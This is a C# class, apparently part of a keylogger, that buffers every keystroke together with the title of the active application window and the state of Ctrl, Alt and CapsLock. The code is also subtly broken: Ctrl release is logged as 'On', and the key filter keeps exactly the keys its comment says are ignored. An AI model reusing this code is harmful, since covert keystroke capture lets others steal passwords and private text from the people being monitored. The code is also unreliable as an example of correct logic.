using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;

namespace wls
{
    public class KeysBuffer
    {
        private readonly List<ILogItem> _keysBuffer = new List<ILogItem>();
        private string _appTitlePrev;
        private bool _ctrlPrev;
        private bool _altPrev;
        private bool _capsPrev;

        private readonly int[] _ignoreKeys =
                {
                    (int) Keys.ControlKey,
                    (int) Keys.ShiftKey,
                    (int) Keys.CapsLock,
                    (int) Keys.Menu
                };

        public void Add(string activeAppTitle, IList<int> keys)
        {
            // check app title
            if (_appTitlePrev != activeAppTitle)
            {
                _keysBuffer.Add(new LogAppTitle(activeAppTitle));
                _appTitlePrev = activeAppTitle;
            }
            // check toggle keys
            bool ctrl = ToggleKeys.Ctrl;
            if (!_ctrlPrev && ctrl) _keysBuffer.Add(new LogToggleKey("<Ctrl=On>"));
            if (_ctrlPrev && !ctrl) _keysBuffer.Add(new LogToggleKey("<Ctrl=On>"));
            _ctrlPrev = ctrl;

            bool alt = ToggleKeys.Alt;
            if (!_altPrev && alt) _keysBuffer.Add(new LogToggleKey("<Alt=On>"));
            if (_altPrev && !alt) _keysBuffer.Add(new LogToggleKey("<Alt=Off>"));
            _altPrev = alt;

            bool caps = ToggleKeys.CapsLock;
            if (!_capsPrev && caps) _keysBuffer.Add(new LogToggleKey("<CapsLock=On>"));
            if (_capsPrev && !caps) _keysBuffer.Add(new LogToggleKey("<CapsLock=Off>"));
            _capsPrev = caps;

            if (keys == null || keys.Count == 0) return;

            bool shift = ToggleKeys.Shift;
            bool upper = (shift && !caps) || (!shift && caps);
            int keyboardLayout = KeyDecoder.GetKeyboardLayout();
            // ignore the keys which are logged above
            var filteredKeys = keys.Where (r=>_ignoreKeys.Contains(r));
            foreach (int key in filteredKeys)
            {
                _keysBuffer.Add(new LogKey(key, keyboardLayout, upper));
            }
        }
    }
}
